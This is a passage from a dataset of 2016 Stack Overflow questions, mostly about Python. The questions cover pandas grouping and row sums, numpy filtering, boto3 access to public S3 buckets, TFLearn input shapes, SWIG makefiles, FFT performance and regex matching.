for both options <strong>i don't get any error and nothing is logged in console</strong>. What do i do wrong?</p>

<p>P.S. maybe also useful that i run it on Win 10 x64</p>
"
40133016,3357979.0,2016-10-19 13:38:33+00:00,4,How to group pandas DataFrame by varying dates?,"<p>I am trying to roll up daily data into fiscal quarter data.  For example, I have a table with fiscal quarter end dates:</p>

<pre><code>Company Period Quarter_End
M       2016Q1 05/02/2015
M       2016Q2 08/01/2015
M       2016Q3 10/31/2015
M       2016Q4 01/30/2016
WFM     2015Q2 04/12/2015
WFM     2015Q3 07/05/2015 
WFM     2015Q4 09/27/2015
WFM     2016Q1 01/17/2016
</code></pre>

<p>and a table of daily data:</p>

<pre><code>Company Date       Price
M       06/20/2015 1.05
M       06/22/2015 4.05
M       07/10/2015 3.45
M       07/29/2015 1.86
M       08/24/2015 1.58
M       09/02/2015 8.64
M       09/22/2015 2.56
M       10/20/2015 5.42
M       11/02/2015 1.58
M       11/24/2015 4.58
M       12/03/2015 6.48
M       12/05/2015 4.56
M       01/03/2016 7.14
M       01/30/2016 6.34
WFM     06/20/2015 1.05
WFM     06/22/2015 4.05
WFM     07/10/2015 3.45
WFM     07/29/2015 1.86
WFM     08/24/2015 1.58
WFM     09/02/2015 8.64
WFM     09/22/2015 2.56
WFM     10/20/2015 5.42
WFM     11/02/2015 1.58
WFM     11/24/2015 4.58
WFM     12/03/2015 6.48
WFM     12/05/2015 4.56
WFM     01/03/2016 7.14
WFM     01/17/2016 6.34
</code></pre>

<p>And I would like to create the table below.</p>

<pre><code>Company Period  Quarter_end Sum(Price)
M       2016Q2  8/1/2015    10.41
M       2016Q3  10/31/2015  18.2
M       2016Q4  1/30/2016   30.68
WFM     2015Q3  7/5/2015    5.1
WFM     2015Q4  9/27/2015   18.09
WFM     2016Q1  1/17/2016   36.1
</code></pre>

<p>However, I don't know how to group by varying dates without looping through each record. Any help is greatly appreciated.</p>

<p>Thanks!</p>
"
39817081,2505645.0,2016-10-02 12:38:34+00:00,4,typing.Any vs object?,"<p>Is there any difference between using <code>typing.Any</code> as opposed to <code>object</code> in typing? For example:</p>

<pre><code>def get_item(L: list, i: int) -&gt; typing.Any:
    return L[i]
</code></pre>

<p>Compared to:</p>

<pre><code>def get_item(L: list, i: int) -&gt; object:
    return L[i]
</code></pre>
"
39976348,2844655.0,2016-10-11 11:34:07+00:00,4,Pandas Slow. Want first occurrence in DataFrame,"<p>I have a DataFrame of <code>people</code>. One of the columns in this DataFrame is a <code>place_id</code>. I also have a DataFrame of places, where one of the columns is <code>place_id</code> and another is <code>weather</code>. For every person, I am trying to find the corresponding weather. Importantly, many people have the same <code>place_id</code>s. </p>

<p>Currently, my setup is this:</p>

<pre><code>def place_id_to_weather(pid):
    return place_df[place_df['place_id'] == pid]['weather'].item() 

person_df['weather'] = person_df['place_id'].map(place_id_to_weather)`
</code></pre>

<p>But this is untenably slow. I would like to speed this up. I suspect that I could achieve a speedup like this:</p>

<p>Instead of returning <code>place_df[...].item()</code>, which does a search for <code>place_id == pid</code> for that entire column and returns a series, and then grabbing the first item in that series, I really just want to curtail the search in <code>place_df</code> after the first match <code>place_df['place_id']==pid</code> has been found. After that, I don't need to search any further. How do I limit the search to first occurrences only?</p>

<p>Are there other methods I could use to achieve a speedup here? Some kind of join-type method?</p>
"
39963745,,2016-10-10 17:34:09+00:00,4,Download files from public S3 bucket with boto3,"<p>I cannot download a file or even get a listing of the <strong>public</strong> S3 bucket with <code>boto3</code>.</p>

<p>The code below works with my own bucket, but not with public one:</p>

<pre><code>def s3_list(bucket, s3path_or_prefix):
    bsession = boto3.Session(aws_access_key_id=settings.AWS['ACCESS_KEY'],
                             aws_secret_access_key=settings.AWS['SECRET_ACCESS_KEY'],
                             region_name=settings.AWS['REGION_NAME'])
    s3 = bsession.resource('s3')
    my_bucket = s3.Bucket(bucket)
    items = my_bucket.objects.filter(Prefix=s3path_or_prefix)
    return [ii.key for ii in items]
</code></pre>

<p>I get an <code>AccessDenied</code> error on this code. The bucket is not in my own and I cannot set permissions there, but I am sure it is open to public read.</p>
"
40064422,1236057.0,2016-10-15 21:30:02+00:00,4,Issues with shaping Tensorflow/TFLearn inputs/outputs for images,"<p>To learn more about deep learning and computer vision, I'm working on a project to perform lane-detection on roads. I'm using TFLearn as a wrapper around Tensorflow.</p>

<p><strong>Background</strong></p>

<p>The training inputs are images of roads (each image represented as a 50x50 pixel 2D array, with each element being a luminance value from 0.0 to 1.0).</p>

<p>The training outputs are the same shape (50x50 array), but represent the marked lane area. Essentially, non-road pixels are 0, and road pixels are 1.</p>

<p>This is not a fixed-size image classification problem, but instead a problem of detecting road vs. non-road pixels from a picture.</p>

<p><strong>Problem</strong></p>

<p>I've not been able to successfully shape my inputs/outputs in a way that TFLearn/Tensorflow accepts, and I'm not sure why. Here is my sample code:</p>

<pre><code># X = An array of training inputs (of shape (50 x 50)).
# Y = An array of training outputs (of shape (50 x 50)).

# ""None"" equals the number of samples in my training set, 50 represents
# the size of the 2D image array, and 1 represents the single channel
# (grayscale) of the image.
network = input_data(shape=[None, 50, 50, 1])

network = conv_2d(network, 50, 50, activation='relu')

# Does the 50 argument represent the output shape? Should this be 2500?
network = fully_connected(network, 50, activation='softmax')

network = regression(network, optimizer='adam', loss='categorical_crossentropy', learning_rate=0.001)

model = tflearn.DNN(network, tensorboard_verbose=1)

model.fit(X, Y, n_epoch=10, shuffle=True, validation_set=(X, Y), show_metric=True, batch_size=1)
</code></pre>

<p>The error I receive is on the <code>model.fit</code> call, with error:</p>

<p><code>ValueError: Cannot feed value of shape (1, 50, 50) for Tensor u'InputData/X:0', which has shape '(?, 50, 50, 1)'</code></p>

<p>I've tried reducing the sample input/output arrays to a 1D vector (with length 2500), but that leads to other errors.</p>

<p>I'm a bit lost with how to shape all this, any help would be greatly appreciated!</p>
"
39602824,1479974.0,2016-09-20 20:00:39+00:00,4,pandas: replace string with another string,"<p>I have the following data frame</p>

<pre><code>    prod_type
0   responsive
1   responsive
2   respon
3   r
4   respon
5   r
6   responsive
</code></pre>

<p>I would like to replace <code>respon</code> and <code>r</code> with <code>responsive</code>, so the final data frame is</p>

<pre><code>    prod_type
0   responsive
1   responsive
2   responsive
3   responsive
4   responsive
5   responsive
6   responsive
</code></pre>

<p>I tried the following but it did not work:</p>

<pre><code>df['prod_type'] = df['prod_type'].replace({'respon' : 'responsvie'}, regex=True)
df['prod_type'] = df['prod_type'].replace({'r' : 'responsive'}, regex=True)
</code></pre>
"
39602785,6263724.0,2016-09-20 19:58:04+00:00,4,Complex time operations in Pandas,"<p>Below is a small sample of my very large dataframe:</p>

<pre><code>In [38]: df
Out[38]:
          Send_Customer         Pay_Customer           Send_Time
 0       1000000000284044644  1000000000251680999 2016-08-01 09:55:48
 1       2000000000223021617  1000000000190078650 2016-08-01 02:44:23
 2       2000000000289301033  1000000000309048473 2016-08-01 09:20:14
 3       1000000000333893941  1000000000333956151 2016-08-01 09:20:14
 4       1000000000340371553  2000000000103942022 2016-08-01 09:20:14
 5       2000000000098132192  2000000000089264458 2016-08-01 09:21:27
 6       1000000000007716594  2000000000144437513 2016-08-01 09:20:54
 7       1000000000135884145  1000000000278399847 2016-08-01 09:21:43
 8       2000000000141318366  2000000000151080468 2016-08-01 09:20:46
 9       1000000000056842546  2000000000139908360 2016-08-01 09:20:55
10       1000000000275051425  2000000000254558241 2016-08-01 09:20:17
11       1000000000162362467  1000000000340653197 2016-08-01 09:23:45
12       1000000000039529533  1000000000072903285 2016-08-01 09:22:56
13       1000000000034147075  2000000000079408765 2016-08-01 09:20:17
14       1000000000319501203  1000000000337830072 2016-08-01 09:20:20
15       1000000000025289495  2000000000287368163 2016-08-01 09:20:31
16       1000000000043110429  1000000000209850047 2016-08-01 09:22:33
</code></pre>

<p>I need to find out, in a timespan of 10 hours, how many non-unique or unique <code>Pay_Customers</code> a <code>Send_Customer</code> has?</p>

<p>So, here is the approach I am using:</p>

<pre><code>In [39]: df['time_diff'] = df.groupby('Send_Customer')['Send_Time'].apply(lambda x : x.diff().abs())

In [41]: df[df['time_diff']&lt;=dt.timedelta(seconds=36000)]
Out[41]:

Send_Customer         Pay_Customer           Send_Time         \       

4361    1000000000284044644  1000000000326834813 2016-08-01 14:32:17
7530    2000000000223021617  1000000000340199555 2016-08-01 04:49:41
10937   2000000000148219588  1000000000312697109 2016-08-01 04:49:40
12876   1000000000339947901  2000000000218218239 2016-08-01 14:51:51
13553   1000000000248905073  1000000000248729812 2016-08-01 16:44:35
14281   2000000000270573223  1000000000341120021 2016-08-01 09:35:11

        time_diff
4361     00:10:37
7530     00:17:06
10937    01:09:45
12876    00:53:59
13553    01:12:17
14281    05:19:34
</code></pre>

<p>This approach works partially as using <code>.diff()</code> on <code>['Send_Time']</code> eliminates the first row that was used to take the difference. Any thoughts on how to preserve such rows?</p>
"
40059890,,2016-10-15 13:55:06+00:00,4,Import settings from the file,"<p>I would like to import settings from a yaml file, but make them available as regular variables in the current context.</p>

<p>for example I may have a file:</p>

<pre><code>param1: 12345

param2: test11

param3:
    a: 4
    b: 7
    c: 9
</code></pre>

<p>And I would like to have variables <code>param1</code>, <code>param2</code>, <code>param3</code> in my code.</p>

<p>I may want to use this from any function and do not want to have them available globally.</p>

<p>I have heard about <code>locals()</code> and <code>globals()</code> functuons, but did not get how to use them for this.</p>
"
39691091,4591810.0,2016-09-25 19:43:22+00:00,4,How to split up a string on multiple delimiters but only capture some?,"<p>I want to split a string on any combination of delimiters I provide. For example, if the string is:  </p>

<pre><code>s = 'This, I think,., Ú©Ø¨Ø§Ø¨ MAKES , some sense '
</code></pre>

<p>And the delimiters are <code>\.</code>, <code>,</code>, and <code>\s</code>. However I want to capture all delimiters except whitespace <code>\s</code>. The output should be:  </p>

<pre><code>['This', ',', 'I', 'think', ',.,', 'Ú©Ø¨Ø§Ø¨', 'MAKES', ',', 'some', 'sense']
</code></pre>

<p>My solution so far is is using the <code>re</code> module:  </p>

<pre><code>pattern = '([\.,\s]+)'  
re.split(pattern, s)
</code></pre>

<p>However, this captures whitespace as well. I have tried using other patterns like <code>[(\.)(,)\s]+</code> but they don't work.</p>

<p><em>Edit</em>: @PadraicCunningham made an astute observation. For delimiters like <code>Some text ,. , some more text</code>, I'd only want to remove leading and trailing whitespace from <code>,. ,</code> and not whitespace within.</p>
"
39973360,6824986.0,2016-10-11 08:36:43+00:00,4,How to pass a list of lists through a for loop in Python?,"<p>I have a list of lists :</p>

<pre><code>sample = [['TTTT', 'CCCZ'], ['ATTA', 'CZZC']]
count = [[4,3],[4,2]]
correctionfactor  = [[1.33, 1.5],[1.33,2]]
</code></pre>

<p>I calculate frequency of each character (pi), square it and then sum (and then I calculate het = 1 - sum). </p>

<pre><code>The desired output [[1,2],[1,2]] #NOTE: This is NOT the real values of expected output. I just need the real values to be in this format. 
</code></pre>

<p>The problem: I do not how to pass the list of lists(sample, count) in this loop to extract the values needed. I previously passed only a list (eg <code>['TACT','TTTT'..]</code>) using this code. </p>

<ul>
<li>I suspect that I need to add a larger for loop, that indexes over each element in sample (i.e. indexes over <code>sample[0] = ['TTTT', 'CCCZ']</code> and <code>sample[1] = ['ATTA', 'CZZC']</code>. I am not sure how to incorporate that into the code.</li>
</ul>

<p>**
Code</p>

<pre><code>list_of_hets = []
for idx, element in enumerate(sample):
    count_dict = {}
    square_dict = {}
    for base in list(element):
         if base in count_dict:
            count_dict[base] += 1
        else:
            count_dict[base] = 1
    for allele in count_dict: #Calculate frequency of every character
        square_freq = (count_dict[allele] / count[idx])**2 #Square the frequencies
        square_dict[allele] = square_freq        
    pf = 0.0
    for i in square_dict:
        pf += square_dict[i]   # pf --&gt; pi^2 + pj^2...pn^2 #Sum the frequencies
    het = 1-pf                    
    list_of_hets.append(het)
print list_of_hets

""Failed"" OUTPUT:
line 70, in &lt;module&gt;
square_freq = (count_dict[allele] / count[idx])**2
TypeError: unsupported operand type(s) for /: 'int' and 'list'er
</code></pre>
"
40132352,4948165.0,2016-10-19 13:10:04+00:00,4,python filter 2d array by a chunk of data,"<pre><code>import numpy as np

data = np.array([
    [20,  0,  5,  1],
    [20,  0,  5,  1],
    [20,  0,  5,  0],
    [20,  1,  5,  0],
    [20,  1,  5,  0],
    [20,  2,  5,  1],
    [20,  3,  5,  0],
    [20,  3,  5,  0],
    [20,  3,  5,  1],
    [20,  4,  5,  0],
    [20,  4,  5,  0],
    [20,  4,  5,  0]
])
</code></pre>

<p>I have the following 2d array. lets called the fields <code>a, b, c, d</code> in the above order where column <code>b</code> is like <code>id</code>. I wish to delete all cells that doesnt have atlist 1 appearance of the number ""1"" in column <code>d</code> for all cells with the same number in column <code>b</code> (same id) so after filtering i will have the following results:</p>

<pre><code>[[20  0  5  1]
 [20  0  5  1]
 [20  0  5  0]
 [20  2  5  1]
 [20  3  5  0]
 [20  3  5  0]
 [20  3  5  1]]
</code></pre>

<p>all rows with <code>b = 1</code> and <code>b = 4</code> have been deleted from the data</p>

<p>to sum up because I see answers that doesnt fit. we look at chunks of data by the <code>b</code> column. if a complete chunk of data doesnt have even one appearance of the number ""1"" in column <code>d</code> we delete all the rows of that <code>b</code> item. in the following example we can see a chunk of data with <code>b = 1</code> and <code>b = 4</code> (""id"" = 1 and ""id"" = 4) that have 0 appearances of the number ""1"" in column <code>d</code>. thats why it gets deleted from the data </p>
"
39696818,5527679.0,2016-09-26 07:16:31+00:00,4,Which one is good practice about python formatted string?,"<p>Suppose I have a file on <code>/home/ashraful/test.txt</code>. Simply I just want to open the file. 
Now my question is:</p>

<p>which one is good practice?</p>

<p><strong>Solution 1:</strong> </p>

<pre><code>dir = ""/home/ashraful/""
fp = open(""{0}{1}"".format(dir, 'test.txt'), 'r')
</code></pre>

<p><strong>Solution 2:</strong> </p>

<pre><code>dir = ""/home/ashraful/""
fp = open(dir + 'test.txt', 'r')
</code></pre>

<p>The both way I can open file. </p>

<p>Thanks :) </p>
"
39821166,6820197.0,2016-10-02 20:06:54+00:00,4,How to reverse the elements in a sublist?,"<p>I'm trying to create a function that reverses the order of the elements in a list, and also reverses the elements in a sublist. for example:</p>

<p>For example, if L = [[1, 2], [3, 4], [5, 6, 7]] then deep_reverse(L) mutates L to be [[7, 6, 5], [4, 3], [2, 1]]</p>

<p>I figured out how to reverse the order of one list, but I am having troubles with reversing the order of elements in a sublist. This is what I have so far:</p>

<pre><code>def deep_reverse(L)
    """""" 
    assumes L is a list of lists whose elements are ints
    Mutates L such that it reverses its elements and also 
    reverses the order of the int elements in every element of L. 
    It does not return anything.
    """"""
    for i in reversed(L):
          print(i)
</code></pre>

<p>In the example above, my code would just print <code>[5,6,7], [3,4], [1,2]</code>, which is not what i'm trying to accomplish. It's just reversing the order of the lists, the not actual elements in the lists.</p>

<p>What should I add to the code so that it also reverses the order of the elements in a sublist?</p>

<p>[<strong>EDIT</strong>: my code <strong>needs</strong> to mutate the list; I don't want it just to print it, it actually needs to change the list.]</p>
"
40063242,6912717.0,2016-10-15 19:18:49+00:00,4,Python dataframe sum rows,"<p>If I have a dataframe with <code>n</code> rows, is there a way to set the ith row to be sum of <code>row[i]</code> and <code>row[i-1]</code> and do this so that the assignment to earlier rows is reflected in the latter rows? I would really like to avoid loops if possible.</p>

<p>Example DF:</p>

<pre><code>             SPY   AAPL   GOOG
2011-01-10  0.44  -0.81   1.80
2011-01-11  0.00   0.00   0.00
2011-01-12 -1.11  -2.77  -0.86
2011-01-13 -0.91  -4.02  -0.68
</code></pre>

<p>Sample pseudo code of summing two rows:</p>

<pre><code>DF[2011-01-11] = DF[2011-01-10] + DF[2011-01-11]
DF[2011-01-12] = DF[2011-01-11] + DF[2011-01-12]
</code></pre>

<p>and so on.</p>
"
40063034,5248253.0,2016-10-15 18:59:57+00:00,4,Fill a multidimensional array efficiently that have many if else statements,"<p>I want to fill an 4dim numpy array in a specific and efficient way. Because I don't know better I startet to write the code with if else statements, but that doesn't look nice, is probably slow and I also can not be really sure if I thought about every combination. Here is the code which I stopped writing down:</p>

<pre><code>sercnew2 = numpy.zeros((gn, gn, gn, gn))
for x1 in range(gn):
    for x2 in range(gn):
        for x3 in range(gn):
            for x4 in range(gn):
                if x1 == x2 == x3 == x4: 
                    sercnew2[x1, x2, x3, x4] = ewp[x1]
                elif x1 == x2 == x3 != x4:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x4]
                elif x1 == x2 == x4 != x3:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x3]
                elif x1 == x3 == x4 != x2:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x2]
                elif x2 == x3 == x4 != x1:
                    sercnew2[x1, x2, x3, x4] = ewp[x2] * ewp[x1]
                elif x1 == x2 != x3 == x4:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x3]
                elif ... many more combinations which have to be considered
</code></pre>

<p>So basically what should happen is, that if all variables (x1, x2, x3, x4) are different from each other, the entry would be: </p>

<pre><code>sercnew2[x1, x2, x3, x4] = ewp[x1]* ewp[x2] * ewp[x3] * ewp[x4]
</code></pre>

<p>Now if lets say the variable x2 and x4 is the same then:</p>

<pre><code>sercnew2[x1, x2, x3, x4] = ewp[x1]* ewp[x2] * ewp[x3]
</code></pre>

<p>Others examples can be seen in the code above. Basically if two or more variables are the same, then I only consider on of them. I hope the pattern is clear. Otherwise please let me note and I will try to express my problem better. I am pretty sure, that there is a much more intelligent way to do it. Hope you know better and thanks in advance :)   </p>
"
39830598,3809375.0,2016-10-03 11:32:23+00:00,4,How to rebuild project after SWIG files changed?,"<p>Given the below makefile:</p>

<pre><code>TARGET = _example.pyd
OFILES = example.obj example_wrap.obj
HFILES =

CC = cl
CXX = cl
LINK = link
CPPFLAGS = -DNDEBUG -DUNICODE -DWIN32 -I. -Id:\virtual_envs\py351\include
CFLAGS = -nologo -Zm200 -Zc:wchar_t- -FS -Zc:strictStrings -O2 -MD -W3 -w44456 -w44457 -w44458
CXXFLAGS = -nologo -Zm200 -Zc:wchar_t- -FS -Zc:strictStrings -D_HAS_EXCEPTIONS=0 -O2 -MD -W3 -w34100 -w34189 -w44996 -w44456 -w44457 -w44458 -wd4577
LFLAGS = /LIBPATH:. /NOLOGO /DYNAMICBASE /NXCOMPAT /DLL /MANIFEST /MANIFESTFILE:$(TARGET).manifest /SUBSYSTEM:WINDOWS /INCREMENTAL:NO
LIBS = /LIBPATH:d:\virtual_envs\py351\libs python35.lib
.SUFFIXES: .c .cpp .cc .cxx .C


{.}.cpp{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.cc{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.cxx{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.C{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.c{}.obj::
    $(CC) -c $(CFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

all: $(TARGET)

$(OFILES): $(HFILES)

$(TARGET): $(OFILES)
    $(LINK) $(LFLAGS) /OUT:$(TARGET) @&lt;&lt;
      $(OFILES) $(LIBS)
&lt;&lt;
    mt -nologo -manifest $(TARGET).manifest -outputresource:$(TARGET);2

install: $(TARGET)
    @if not exist d:\virtual_envs\py351\Lib\site-packages mkdir d:\virtual_envs\py351\Lib\site-packages
    copy /y $(TARGET) d:\virtual_envs\py351\Lib\site-packages\$(TARGET)

clean:
    -del $(TARGET)
    -del *.obj
    -del *.exp
    -del *.lib
    -del $(TARGET).manifest

test:
    python runme.py
</code></pre>

<p>I'd like to improve a couple of things here:</p>

<ul>
<li>I'd like to consider swig files (*.i) in the makefile. For example, every time some swig file has been changed a new wrap file should be generated (ie: swig -python -c++ file_has_changed.cpp) and then rebuild the project</li>
<li>I'd like to avoid having hardcoded object files. For instance, I'd like to use all cpp files using wildcards somehow</li>
</ul>

<p>I've read a little bit of the docs talking about <a href=""https://msdn.microsoft.com/en-us/library/yz1tske6.aspx"" rel=""nofollow"">Makefiles</a> but I'm still pretty much confused. How could I achieve this?</p>

<p>Right now I'm using a <strong>hacky</strong> solution like <code>swig -python -c++ whatever_file.i &amp;&amp; nmake</code>, that's of course it's not ideal at all</p>

<p>REFERENCES</p>

<p>Achieving this inside visual studio IDE is quite easy following <a href=""http://stackoverflow.com/questions/5969173/how-to-swig-in-vs2010/6117641#6117641"">these steps</a> but I'd like to use this makefile inside SublimeText, that's why I'm quite interested on knowing how to have a proper Makefile</p>
"
39967037,5086903.0,2016-10-10 21:29:35+00:00,4,I'm getting an List index out of range error for an index that exist,"<p>Im using feed parser to obtain rss objects. When I run </p>

<pre><code>live_leak.links
</code></pre>

<p>I get</p>

<pre><code>[{'type': 'text/html', 'rel': 'alternate', 'href': 
'http://www.liveleak.com/view?i=abf_1476121939'}, 

{'type': 'application/x-shockwave-flash', 'rel': 'enclosure', 'href':
 'http://www.liveleak.com/e/abf_1476121939'}]
</code></pre>

<p>But when i try this</p>

<pre><code>live_leak.links[1]
</code></pre>

<p>I get list index out of range, mind you this was working earlier then all of a sudden this didn't work. I had this in my code and it took me hours to find because I didn't realize it was this that wasn't working. If no one knows I'll do a string replace as a hack but I rather do what was already working.</p>

<p>this also works </p>

<pre><code>live_leak[0]
</code></pre>

<p>it returns</p>

<pre><code>[{'type': 'text/html', 'rel': 'alternate', 'href': 
'http://www.liveleak.com/view?i=abf_1476121939'}]
</code></pre>

<p>which is weird because the other one won't work</p>

<h1>EDIT</h1>

<pre><code>def pan_task():
        url = 'http://www.liveleak.com/rss?featured=1'
        name = 'live leak'
        live_leaks = [i for i in feedparser.parse(url).entries]
        the_count = len(live_leaks)
        ky = feedparser.parse(url).keys()
        oky = [i.keys() for i in feedparser.parse(url).entries][:12] # shows what I can pull

        try:
            live_entries = [{
                             'html': live_leak.links,
                             'href': live_leak.links[0]['href'],
                             'src': live_leak.media_thumbnail[0]['url'],
                             'text': live_leak.title,
                             'comments': live_leak.description,
                             'url': live_leak.links[0]['href'],
                             'embed': live_leak.links[1]['href'],
                             'text': live_leak.title,
                             'comments': live_leak.description,
                             'name': name,
                             'url': live_leak.link, # this is the link to the source
                             'author': None,
                             'video': False
                             } for live_leak in live_leaks]
        except IndexError:
            print('error check logs')
            live_entries = []

        # for count, elem in enumerate(live_entries):
        #     the_html = requests.get(live_entries[count]['url']) # a specific text

        return print(live_entries[0])
</code></pre>
"
39634577,4533188.0,2016-09-22 08:59:23+00:00,4,"Are methods instanciated with classes, consuming lots of memory (in Scala)?","<h2>Situation</h2>

<p>I am going to build a program (in Scala or Python - not yet decided) that is intensive on data manipulation. I see two mayor approaches:</p>

<ol>
<li><strong>Approach:</strong> Define a collection of the data. Write my function. Send the entire dataset through the function.</li>
<li><strong>Approach:</strong> Define a data class that represents a single data entity and code the method (class member) into the data class. Parts of the method that should be flexible are send to the method via Scala Function or Python lambda.</li>
</ol>

<h2>Side question</h2>

<p>I am not sure but the first approach might be more functional programming like, the second more OOP, is that right? By the way, I love both Functional Programming and OOP (some say they are opposites of each other, but Odersky tried his best to disprove that with Scala).</p>

<h2>Main question</h2>

<p>I prefer the second approach, because</p>

<ol>
<li>It seems more concise to me.</li>
<li>It makes it easier to distribute the program in a shared-nothing architecture Big Data setting, since it brings functionality to the data and not data to functionality following the principle of data locality.</li>
</ol>

<p>However, <em>I worry that if I have a lot of data (and I do), I will have a lot of memory consumption because the method might have to be instantiated so many times.</em></p>

<ol>
<li><strong>Question:</strong> Is that true for Scala/JVM - if not, how is it solved?</li>
<li><strong>Question:</strong> Is that true for Python - if not, how is it solved?</li>
</ol>

<h2>Follow-up question</h2>

<p>Leading me up to: Which approach should I choose?</p>

<h2>More Context</h2>

<ul>
<li>I have lot of data (millions, potentially billions of data objects)</li>
<li>I have not that many functions to implement. To give a ballpark figure, let's say about 10.</li>
<li>I expect a lot of calls to the methods though.</li>
<li>Let's say I have 100 calls per data entity, then I would have 100 * 1 million calls for the entire program.</li>
<li>My data class represents a single entity, not the entire dataset. </li>
<li>My worry is that with each instantiation of my DataObject class, the code of the method needs to be duplicated, which would cost a lot of memory and processing power. I have no idea how the internals of the JVM and Python work in this regard and whether that is true - that is what I am asking.</li>
</ul>

<p>Here a crude DataObject class:</p>

<pre><code>class DataObject {

    List datavalues

    def mymethod(){
        ...
    }
}
</code></pre>
"
39644202,5690982.0,2016-09-22 16:23:41+00:00,4,Assigning empty list,"<p>I don't really know how I stumbled upon this, and I don't know what to think about it, but apparently <code>[] = []</code> is a legal operation in python, so is <code>[] = ''</code>, but <code>'' = []</code> is not allowed. It doesn't seem to have any effect though, but I'm wondering: what the hell ? </p>
"
40061307,5269892.0,2016-10-15 16:08:54+00:00,4,Comparatively slow python numpy 3D Fourier Transformation,"<p>Dear StackOverflow community!</p>

<p>For my work I need to perform discrete fourier transformations (DFTs) on large images. In the current example I require a 3D FT for a 1921 x 512 x 512 image (along with 2D FFTs of 512 x 512 images). Right now, I am using the numpy package and the associated function <a href=""http://docs.scipy.org/doc/numpy/reference/generated/numpy.fft.fftn.html"" rel=""nofollow"">np.fft.fftn()</a>. The code snippet below exemplarily shows 2D and 3D FFT times on an equal-sized/slightly smaller 2D/3D random-number-generated grid in the following way:</p>

<pre><code>import sys
import numpy as np
import time

tas = time.time()
a = np.random.rand(512, 512)
tab = time.time()
b = np.random.rand(100, 512, 512)

tbfa = time.time()

fa = np.fft.fft2(a)
tfafb = time.time()
fb = np.fft.fftn(b)
tfbe = time.time()

print ""initializing 512 x 512 grid:"", tab - tas
print ""initializing 100 x 512 x 512 grid:"", tbfa - tab
print ""2D FFT on 512 x 512 grid:"", tfafb - tbfa
print ""3D FFT on 100 x 512 x 512 grid:"", tfbe - tfafb
</code></pre>

<p>Output:</p>

<pre><code>initializing 512 x 512 grid: 0.00305700302124
initializing 100 x 512 x 512 grid: 0.301637887955
2D FFT on 512 x 512 grid: 0.0122730731964
3D FFT on 100 x 512 x 512 grid: 3.88418793678
</code></pre>

<p>The problem that I have is that I will need this process quite often, so the time spent per image should be short. When testing on my own computer (middle-segment laptop, 2GB RAM allocated to virtual machine (--> therefore smaller test grid)), as you can see the 3D FFT takes ~ 5 s (order-of-magnitude). Now, at work, the machines are way better, cluster/grid-architecture systems and FFTs are much faster. In both cases the 2D ones finish quasi instantaneously.</p>

<p>However with 1921x512x512, <a href=""http://docs.scipy.org/doc/numpy/reference/generated/numpy.fft.fftn.html"" rel=""nofollow"">np.fft.fftn()</a> takes ~ 5 min. Since I guess scipy's implementation is not much faster and considering that on MATLAB FFTs of same-sized grids finish within ~ 5 s, my question is whether there is a method to speed the process up to or almost to MATLAB times. My knowledge about FFTs is limited, but apparently MATLAB uses the FFTW algorithm, which python does not. Any reasonable chance that with some pyFFTW package I get similar times? Also, 1921 seems an unlucky choice, having only 2 prime factors (17, 113), so I assume this also plays a role. On the other hand 512 is a well-suited power of two. Are MATLAB-like times achievable if possible also without padding up with zeros to 2048?</p>

<p>I'm asking because I'll have to use FFTs a lot (to an amount where such differences will be of huge influence!) and in case there is no possibility to reduce computation times in python, I'd have to switch to other, faster implementations.</p>

<p>Any advice is greatly appreciated!</p>
"
39836953,823743.0,2016-10-03 17:16:08+00:00,4,How to draw a precision-recall curve with interpolation in python?,"<p>I have drawn a precision-recall curve using <code>sklearn</code> <code>precision_recall_curve</code>function and <code>matplotlib</code> package. For those of you who are familiar with precision-recall curve you know that some scientific communities only accept it when its interpolated, similar to this example <a href=""http://nlp.stanford.edu/IR-book/html/htmledition/evaluation-of-ranked-retrieval-results-1.html"" rel=""nofollow"">here</a>. Now my question is if any of you know how to do the interpolation in python? I have been searching for a solution for a while now but with no success! Any help would be greatly appreciated. </p>

<p><strong>Solution:</strong> Both solutions by @francis and @ali_m are correct and together solved my problem. So, assuming that you get an output from the <code>precision_recall_curve</code> function in <code>sklearn</code>, here is what I did to plot the graph:</p>

<pre><code>        precision[""micro""], recall[""micro""], _ = precision_recall_curve(y_test.ravel(),scores.ravel())
        pr = copy.deepcopy(precision[0])
        rec = copy.deepcopy(recall[0])
        prInv = np.fliplr([pr])[0]
        recInv = np.fliplr([rec])[0]
        j = rec.shape[0]-2
        while j&gt;=0:
            if prInv[j+1]&gt;prInv[j]:
                prInv[j]=prInv[j+1]
            j=j-1
        decreasing_max_precision = np.maximum.accumulate(prInv[::-1])[::-1]
        plt.plot(recInv, decreasing_max_precision, marker= markers[mcounter], label=methodNames[countOfMethods]+': AUC={0:0.2f}'.format(average_precision[0]))
</code></pre>

<p>And these lines will plot the interpolated curves if you put them in a for loop and pass it the data of each method at each iteration. Note that this will not plot the non-interpolated precision-recall curves.</p>
"
39600161,1899628.0,2016-09-20 17:17:43+00:00,4,Regular expression matching all but a string,"<p>I need to find all the strings matching a pattern with the exception of two given strings. </p>

<p>For example, find all groups of letters with the exception of <code>aa</code> and <code>bb</code>. Starting from this string:</p>

<pre><code>-a-bc-aa-def-bb-ghij-
</code></pre>

<p>Should return:</p>

<pre><code>('a', 'bc', 'def', 'ghij')
</code></pre>

<p>I tried with <a href=""http://pythex.org/?regex=-(%5Cw.*%3F)(%3F%3D-)&amp;test_string=-a-bc-def-ghij-&amp;ignorecase=0&amp;multiline=0&amp;dotall=0&amp;verbose=0"" rel=""nofollow"">this regular</a> expression that captures 4 strings. I thought I was getting close, but (1) it doesn't work in Python and (2) I can't figure out how to exclude a few strings from the search. (Yes, I could remove them later, but my real regular expression does everything in one shot and I would like to include this last step in it.)</p>

